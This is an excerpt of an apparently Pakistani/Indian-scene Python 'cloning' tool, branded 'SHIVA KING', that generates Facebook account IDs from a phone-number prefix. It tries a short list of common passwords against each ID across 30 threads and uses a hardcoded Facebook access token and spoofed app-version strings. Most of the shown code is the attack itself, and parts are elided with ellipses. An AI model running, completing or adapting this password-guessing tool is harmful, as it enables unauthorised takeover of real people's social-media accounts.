...
.dP"Y8 88  88 88 Yb    dP    db        
`Ybo." 88  88 88  Yb  dP    dPYb       
o.`Y8b 888888 88   YbdP    dP__Yb      
8bodP' 88  88 88    YP    dP""""Yb 
...
\033[1;97m[•] 🄰🅄🅃🄷🄾🅁      : SHIVA KING 
\033[1;97m[•] DOST     : SHIVA X RAJAT X JONTY X FAIZ X JARRY X RDX
\033[1;97m[•] 🄵🄰🄲🄴🄱🄾🄾🄺    : https://www.facebook.com/profile.php?id=100088103852576&mibextid=ZbWKwL
\033[1;97m[•] 🅅🄴🅁🅂🄸🄾🄽     : 0.1
\033[1;97m[•] 🅂🅃🄰🅃🅄🅂      : \x1b[38;5;46m🄵🅁🄴🄴
{WHITE}================================================
\x1b[38;5;46mSHIVA KING TLD X DSG BRAND OWNER
{WHITE}=================================================""")
...
def pak():
                user=[]
                clear()
                print('\033[1;32m CODE EXAMPLE : 9123,6062,9542,9934)
                code = input('\033[1;37m PUT CODE: ')
                try:
                        limit = int(input('\033[1;32m EXAMPLE : 2000, 30000, 50000, 100000\n\033[1;37m PUT LIMIT : '))
                except ValueError:
                        limit = 10000
                ...
                with tred(max_workers=30) as TRT:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'first7digit','last7digit','first6digit,''last6digit','fullnumber','sher singh','amit123','raju123','ajay123','ram123','raman','anand','57273200','','786786','full_number']
...
def ffb(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        accessToken = 'EAAGNO4a7r2wBO1vZAk5ZCF91w4J1KL7rRuoh0uXSU0CMs8ASYnR8zPVAJ2B2NzpRiMMWfMhXaBEG7ZBuNph0YubIPteSRTgsfcWW2QstZA3e2VH0ZBPtmw8dDl7N4ZBXWlQDesmPKhCcQi3VoopjHWllt3gAUMnsyirZBKyXhZBHcGOssdZAv4RccRK6DGAZDZD'
...
def uidm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [pandit ji❤] %s|\033[1;32mOK:-%s\033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = 'EAAGNO4a7r2wBO1vZAk5ZCF91w4J1KL7rRuoh0uXSU0CMs8ASYnR8zPVAJ2B2NzpRiMMWfMhXaBEG7ZBuNph0YubIPteSRTgsfcWW2QstZA3e2VH0ZBPtmw8dDl7N4ZBXWlQDesmPKhCcQi3VoopjHWllt3gAUMnsyirZBKyXhZBHcGOssdZAv4RccRK6DGAZDZD'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
